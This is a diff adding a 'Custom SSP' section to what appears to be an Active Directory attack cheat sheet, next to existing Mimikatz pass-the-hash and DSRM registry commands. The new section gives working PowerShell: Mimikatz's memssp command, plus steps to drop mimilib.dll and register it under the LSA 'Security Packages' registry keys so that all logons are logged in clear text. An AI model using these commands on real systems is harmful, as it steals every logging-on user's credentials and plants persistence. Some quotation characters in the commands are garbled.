@@ -842,6 +842,31 @@ New-ItemProperty “HKLM:\System\CurrentControlSet\Control\Lsa\” -Name “Dsrm
 Invoke-Mimikatz -Command '"privilege::debug" “sekurlsa::pth" /domain:dcorp-dc /user:Administrator /ntlm:XXXX /run:powershell.exe"'
 ```
 
+### Custom SSP
+```powershell
+# SSP is a DLL that provides an application ways to authenticated. Some MIcrosoft packages:
+# - NTLM
+# - Kerberos
+# - Wdigest
+# - CredSSP
+# Mimikatz provides a custom SSP in mimilib.dll
+# This lib logs all logons (local, service account, machine account) into a clear text on the computer
+
+# It can be done with mimikatz (not very stable in recent windows Server versions)
+Invoke-Mimikatz -Command '"misc::memssp"'
+
+# Another way is to manually add mimilib.dll as Security package:
+# First drop the mimilib.dll in c:\windows\system32
+# Then modify a registry key to add mimilib.dll as Security Package:
+# HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages
+$packages = Get-ItemProperty HKLM:SYSTEM\CurrentControlSet\Control\Lsa\OSConfig -Name 'Security Packages' | Select -ExpandProperty ìSecurity Packages'
+$packages += "mimilib"
+Set-ItemProperty HKLM:SYSTEM\CurrentControlSet\Control\Lsa\OSConfig -Name 'Security Packages' -value $packages
+Set-ItemProperty HKLM:SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Packages' -value $packages
+
+
+```
+
 ### AdminSDHolder
 - **Idea is to Abuse the object AdminSDHolder and change its ACL to affect ACL of protected groups (Domain admins and similar)**
 ```powershell
